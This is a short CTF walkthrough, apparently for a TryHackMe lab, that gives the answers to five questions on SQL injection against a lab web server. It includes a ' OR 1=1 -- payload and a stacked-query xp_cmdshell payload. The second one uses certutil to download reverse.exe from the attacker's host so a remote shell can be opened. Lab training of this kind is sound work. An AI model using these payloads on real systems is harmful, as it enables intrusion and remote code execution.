<h2>[Day 10] SQL injection Inject the Halls with EXEC Queries</h2>

Let us have some fun with SQL Injections!!!

Today  we have to start both the VM and AttackBox.

## Question 1: Manually navigate the defaced website to find the vulnerable search form. What is the first webpage you come across that contains the gift-finding feature?

Not so difficult to find... Just type the address you see on your web browser!

## Question 2: Analyze the SQL error message that is returned. What ODBC Driver is being used in the back end of the website?

If you follow the that you can find in Testing SQL Injections you can find it with red letters in the middle of the screen...

## Question 3: Inject the 1=1 condition into the Gift Search form. What is the last result returned in the database?

Now again following the same instructions of typing `' OR 1=1 --` after the `http://10.10.24.114/giftresults.php?age=` you can find the answer at the end of a long list you get as response.

## Question 4: What flag is in the note file Gr33dstr left behind on the system?

Now you will have to follow the instructions in the `Remote Code Execution` section. If you are not aware what is happening you can find more about it by searching for Metasploit in the Search function of TryHackMe.

By the way when you start the Terminal you can also find the IP of the AttackBox. You just need to check the ip after `root@ip.....` just change the dashes `-` between the numbers with dots `.`.

Now you need to start the python server.

And send a new request through your web browser. Keep in mind you should use your AttackBox IP
`http://10.10.24.114/giftresults.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://YOUR.IP.ADDRESS.HERE:8000/reverse.exe C:\Windows\Temp\reverse.exe'; --`

Follow the next 2 commands and now you will be able to give commands in the Windows Server

Now you should navigate to `C:\Users\Administrator\Desktop>` and you can find the answer

## Question 5: What is the flag you receive on the homepage after restoring the website?

Just type the command Gr33dstr left in the instructions and then open again the website from your browser!
